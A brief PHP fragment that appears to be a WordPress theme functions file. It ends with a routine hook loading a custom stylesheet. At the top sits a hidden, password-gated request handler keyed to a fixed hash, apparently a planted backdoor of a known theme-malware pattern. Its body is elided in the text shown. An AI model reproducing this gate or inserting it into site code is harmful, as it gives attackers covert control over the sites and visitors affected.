<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '099c05a5b5bcf17aa68a2bc8d6340906'))
	{
...
function us_enqueue_custom_stylesheets() {
    wp_enqueue_style( 'customstyle', get_template_directory_uri() . '/css/custom/custom.css');
}
add_action( 'wp_enqueue_scripts', 'us_enqueue_custom_stylesheets');
